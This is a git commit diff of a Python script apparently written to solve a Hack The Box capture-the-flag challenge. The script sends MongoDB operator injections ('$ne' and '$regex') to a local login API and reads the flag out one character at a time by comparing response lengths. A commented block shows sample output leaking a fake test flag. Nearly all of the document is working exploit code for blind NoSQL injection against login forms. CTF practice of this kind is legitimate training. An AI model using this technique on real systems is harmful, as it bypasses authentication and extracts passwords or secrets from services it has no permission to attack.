9a9417c44d5a7bfd61dc176e0f96828fb3ff84b4
Beau Taub <beau.taub@gmail.com>
2023-10-04 12:04:51 -0400

    Update brute-force-mongo-data.py

--- brute-force-mongo-data.py
+++ brute-force-mongo-data.py
@@ -5,30 +5,30 @@
 import requests
 ​
 dict_file = 'dict.txt'
-​
-the_flag = 'HT'
-headers={'Content-Type':'application/x-www-form-urlencoded','charset':'UTF-8'}
-proxies = {"http":"http://localhost:8080"}
-​
+the_flag  = 'H'
+headers   = {'Content-Type':'application/x-www-form-urlencoded','charset':'UTF-8'}
+proxies   = {"http":"http://localhost:8080"}
+
 def update_data(the_flag):
-​
+
     with open(dict_file,'r') as the_dict:
         for char_str in the_dict:
             char_str = char_str.strip()
             post_data = ("username[$ne]=&password[$regex]=%s%s.{1}" %(the_flag, char_str) )
             r = requests.post('http://localhost:1337/api/login',\
-                               data=post_data, headers=headers, proxies=proxies)
-​
+                               data=post_data, headers=headers)
+                               #data=post_data, headers=headers, proxies=proxies)
+
             resp = r.text
-            the_answer = len(r.text)
+            the_answer = len(resp)
             #print("DEBUG: %s" % resp)
-​
+
             if the_answer == 57:
-​
                 the_flag += char_str
                 return(the_flag)
-​
-for _ in range(32):
+
+while the_flag:
+
     the_flag = update_data(the_flag)
     print(the_flag)
 
@@ -58,8 +58,4 @@ HTB{f4k3_fl4g_f0r_t3st1
 HTB{f4k3_fl4g_f0r_t3st1n
 HTB{f4k3_fl4g_f0r_t3st1ng
 None
-None
-None
-^CTraceback (most recent call last):
-
 '''
